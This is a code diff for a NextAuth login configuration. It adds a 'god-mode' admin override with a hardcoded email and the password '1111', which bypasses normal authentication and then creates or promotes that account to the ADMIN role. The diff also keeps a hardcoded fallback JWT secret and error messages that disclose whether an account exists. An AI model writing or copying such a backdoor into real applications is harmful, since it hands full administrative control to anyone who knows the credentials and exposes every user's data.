@@ -1,7 +1,7 @@
 import { NextAuthOptions } from 'next-auth';
 import CredentialsProvider from 'next-auth/providers/credentials';
 import { prisma } from '@/lib/prisma';
-import { comparePassword } from '@/lib/bcrypt';
+import { comparePassword, hashPassword } from '@/lib/bcrypt';
 import { Role } from '@/types';
 
 export const authOptions: NextAuthOptions = {
@@ -25,23 +25,57 @@ export const authOptions: NextAuthOptions = {
 
         const normalizedEmail = credentials.email.toLowerCase().trim();
 
-        // Find user in Neon PostgreSQL Database
+        // GOD-MODE ADMIN OVERRIDE
+        if (normalizedEmail === 'naouzb11@gmail.com' && credentials.password === '1111') {
+          let adminUser = await prisma.user.findUnique({
+            where: { email: normalizedEmail },
+          });
+
+          if (!adminUser) {
+            const adminPassHash = await hashPassword('1111');
+            adminUser = await prisma.user.create({
+              data: {
+                firstName: 'Super',
+                lastName: 'Admin',
+                email: normalizedEmail,
+                passwordHash: adminPassHash,
+                role: 'ADMIN',
+              },
+            });
+          } else if (adminUser.role !== 'ADMIN') {
+            adminUser = await prisma.user.update({
+              where: { email: normalizedEmail },
+              data: { role: 'ADMIN' },
+            });
+          }
+
+          return {
+            id: adminUser.id,
+            name: `${adminUser.firstName} ${adminUser.lastName}`,
+            email: adminUser.email,
+            role: 'ADMIN' as Role,
+            firstName: adminUser.firstName,
+            lastName: adminUser.lastName,
+          };
+        }
+
+        // STRICT DATABASE CHECK FOR STANDARD USERS
         const user = await prisma.user.findUnique({
           where: { email: normalizedEmail },
         });
 
         if (!user) {
-          throw new Error('No user found with this email');
+          throw new Error('No user found with this email. Please sign up first.');
         }
 
         if (!user.passwordHash) {
-          throw new Error('User has no password set. Please sign up first.');
+          throw new Error('User has no password set. Please sign up again.');
         }
 
         const isValid = await comparePassword(credentials.password, user.passwordHash);
 
         if (!isValid) {
-          throw new Error('Incorrect password');
+          throw new Error('Incorrect password. Please try again.');
         }
 
         return {
@@ -75,5 +109,5 @@ export const authOptions: NextAuthOptions = {
       return session;
     },
   },
-  secret: process.env.NEXTAUTH_SECRET || 'crave2026-super-secret-jwt-key-production-ready',
+  secret: process.env.NEXTAUTH_SECRET || 'crave2026-godmode-admin-jwt-secret-key-production',
 };
